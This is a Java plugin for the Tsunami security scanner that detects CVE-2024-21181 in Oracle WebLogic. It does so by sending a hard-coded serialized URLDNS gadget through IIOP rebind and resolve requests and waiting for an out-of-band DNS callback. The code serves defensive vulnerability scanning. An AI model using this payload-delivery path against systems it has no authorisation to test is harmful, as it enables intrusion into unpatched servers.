/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve202421181;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.tsunami.plugins.detectors.cves.cve202421181.Annotations.OobSleepDuration;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopPacket;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopReply;
import com.google.tsunami.plugins.detectors.cves.cve202421181.weblogic.WeblogicClient;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;
import javax.net.SocketFactory;

/** A Tsunami plugin that detects the WebLogic IIOP Deserialization Bug (CVE-2024-21181) */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "WebLogic IIOP Unsafe Deserialization (CVE-2024-21181)",
    version = "0.2",
    author = "Leonardo Giovannini (leonardo@doyensec.com), Savino Sisco (savio@doyensec.com)",
    description =
        "This plugin detects CVE-2024-21181 (IIOP Unsafe Deserialization vulnerability) in Oracle"
            + " WebLogic.",
    bootstrapModule = WeblogicUnsafeDeserializationDetectorBootstrapModule.class)
public final class WeblogicUnsafeDeserializationDetector implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2024-21181";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Oracle WebLogic IIOP Unsafe Deserialization (CVE-2024-21181)";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected an Oracle WebLogic instance vulnerable to IIOP Unsafe"
          + " Deserialization (CVE-2024-21181). The vulnerability can be exploited by sending an"
          + " unauthenticated IIOP request with a carefully crafted gadget chain that executes"
          + " malicious code\n";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band DNS callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Install the latest security patches released by Oracle.";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;
  private final SocketFactory socketFactory;
  private String weblogicVersion;

  @Inject
  WeblogicUnsafeDeserializationDetector(
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      SocketFactory socketFactory,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.socketFactory = checkNotNull(socketFactory);
    this.oobSleepDuration = oobSleepDuration;
  }

  private String ensureUriHasSchema(String domainOrUrl) {
    if (domainOrUrl.startsWith("http://") || domainOrUrl.startsWith("https://")) {
      return domainOrUrl;
    } else {
      return "http://" + domainOrUrl;
    }
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("WebLogic IIOP Unsafe Deserialization starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWeblogic)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(ImmutableList.toImmutableList()))
        .build();
  }

  /*
   Tries to get the Oracle WebLogic version by using the T3 protocol
  */
  private boolean isWeblogic(NetworkService networkService) {
    HostAndPort target = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
    String version;
    try {
      version =
          WeblogicClient.doT3VersionCheck(target.getHost(), target.getPort(), this.socketFactory);
    } catch (Exception e) {
      // Parsing or connection error, probably not WebLogic
      return false;
    }
    if (version.startsWith("14.") || version.startsWith("12.")) {
      logger.atInfo().log("Identified WebLogic version: %s", version);
      return true;
    } else {
      logger.atInfo().log("Unsupported WebLogic version: %s", version);
      return false;
    }
  }

  private static byte[] generatePayload(String url) throws Exception {
    /*
    Generates a payload using the URLDNS gadget from ysoserial
     */
    URI uri = new URI(url);
    String domain = uri.getHost();

    byte[] start =
        Utils.hexStringToByteArray(
            "ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00034C0004686F737471007E00034C000870726F746F636F6C71007E00034C000372656671007E00037870FFFFFFFFFFFFFFFF74");
    byte[] middle = Utils.hexStringToByteArray("74000071007E000574000468747470707874");
    byte[] end = Utils.hexStringToByteArray("78");

    int buff_size =
        (start.length + middle.length + end.length) // Static parts
            + domain.length()
            + 2 // Domain + String size
            + url.length()
            + 2; // URL + String size

    ByteBuffer buff = ByteBuffer.allocate(buff_size);
    // Initial part
    buff.put(start);

    // Domain
    buff.putShort((short) domain.length());
    buff.put(domain.getBytes(StandardCharsets.UTF_8));

    // Middle part
    buff.put(middle);

    // URL
    buff.putShort((short) url.length());
    buff.put(url.getBytes(StandardCharsets.UTF_8));

    // Ending byte
    buff.put(end);

    buff.limit(buff.position());
    return buff.array();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    Payload payload = this.payloadGenerator.generate(config);

    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "Tsunami Callback Server not available. This detector needs it to detect the"
              + " vulnerability.");
      return false;
    }

    String oobCallbackUrl = ensureUriHasSchema(payload.getPayload());

    HostAndPort target = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());

    logger.atInfo().log("Connecting to WebLogic Server");
    WeblogicClient client;
    try {
      client = WeblogicClient.initialize(target.getHost(), target.getPort(), this.socketFactory);
    } catch (IOException e) {
      logger.atSevere().log("Failed to connect to WebLogic: " + e.getMessage());
      logger.atFine().withCause(e).log("Exception details:");
      return false;
    } catch (Exception e) {
      logger.atSevere().log("WebLogic initialization failed: " + e.getMessage());
      logger.atFine().withCause(e).log("Exception details:");
      return false;
    }

    this.weblogicVersion = client.getVersion();
    logger.atInfo().log("WebLogic Server version: " + this.weblogicVersion);

    // Build the payload
    byte[] gadget;
    String referenceName = String.valueOf(System.currentTimeMillis());
    logger.atInfo().log("Building the serialized payload");
    try {
      gadget = generatePayload(oobCallbackUrl);
    } catch (Exception e) {
      logger.atSevere().withCause(e).log("Failed to build the serialized payload.");
      return false;
    }

    // Send Rebind request
    logger.atInfo().log("Performing REBIND operation.");
    GiopPacket rebind;
    try {
      rebind = client.performRebind(referenceName, gadget);
    } catch (Exception e) {
      logger.atSevere().log("Failed performing REBIND operation: " + e.getMessage());
      logger.atFine().withCause(e).log("Exception details:");
      return false;
    }
    logger.atFine().log("Received REBIND response: " + rebind.payload().info());
    GiopReply rebindReply = (GiopReply) rebind.payload();

    if (rebindReply.replyStatus() != GiopReply.ReplyStatus.STATUS_NO_EXCEPTION) {
      logger.atInfo().log("Server returned an exception: " + rebindReply.replyStatus().name());
      logger.atInfo().log("Target is probably patched.");
      return false;
    } else {
      logger.atInfo().log("Rebind successful, target is probably vulnerable.");
    }

    // Send Resolve request
    logger.atInfo().log("Performing RESOLVE operation.");
    try {
      GiopPacket resolve;
      resolve = client.performResolve(referenceName);
      logger.atFine().log("Received RESOLVE response: " + resolve.payload().info());
      GiopReply resolveReply = (GiopReply) resolve.payload();
      if (resolveReply.replyStatus() == GiopReply.ReplyStatus.STATUS_SYSTEM_EXCEPTION) {
        logger.atInfo().log("Resolve request returned SYSTEM_EXCEPTION, this is expected.");
      } else {
        logger.atWarning().log(
            "Resolve request returned an unexpected status: " + resolveReply.replyStatus().name());
      }
    } catch (Exception e) {
      logger.atSevere().log(
          "Failed performing RESOLVE operation. Let's check the callback anyway.");
      logger.atFine().withCause(e).log("Exception details:");
    }

    // Wait for callback
    logger.atInfo().log("Waiting for callback...");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else {
      logger.atWarning().log("No callback received.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    String additionalDetails = "WebLogic version: " + weblogicVersion;

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION_CALLBACK)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(additionalDetails))
                        .build()))
        .build();
  }
}
